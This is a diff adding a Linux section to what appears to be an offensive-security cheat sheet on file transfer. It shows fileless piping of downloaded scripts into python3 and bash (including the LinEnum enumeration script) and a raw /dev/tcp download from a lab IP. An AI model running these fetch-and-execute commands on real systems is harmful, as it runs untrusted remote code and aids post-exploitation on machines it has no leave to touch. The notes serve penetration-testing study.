@@ -81,6 +81,22 @@ Step 2   Alternative   #### Oneliner to Base64 encode file with certutil into TE
 
 
 
+#################################################################################################
+###############################              LINUX                ###############################
+#################################################################################################
+Some payloads such as mkfifo write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.
+
+#Filess pipe into python
+$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+#When none well-known file transfer tools are available. Built-in /dev/TCP device file can be used for simple file downloads.
+Step 1 $ exec 3<>/dev/tcp/10.10.10.32/80               #connect to web server
+Step 2 $ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3     #get data
+Step 3 $ cat <&3                                       #Print the Response
+
+
+
 
 
 
